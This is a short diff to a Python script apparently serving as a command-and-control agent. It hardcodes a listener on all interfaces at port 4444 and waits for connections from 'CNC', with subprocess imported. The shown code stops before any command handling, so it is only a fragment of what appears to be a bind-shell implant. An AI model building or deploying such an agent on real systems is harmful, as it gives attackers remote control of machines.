@@ -2,16 +2,16 @@ import socket
 import subprocess
 import sys
 
-from cnc import tools
-
-config = tools.parse_config()
 
 socksize = 1024
 
+host = '0.0.0.0'
+port = 4444
+
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server.bind((config['agent_host'], int(config['agent_port'])))
+server.bind((host, port))
 server.listen(1)
-print("Agent started on port: {}\nWaiting for connections from CNC...\n".format(config['agent_port']))
+print("Agent started on port: {}\nWaiting for connections from CNC...\n".format(port))
 conn, addr = server.accept()
 
 while True:
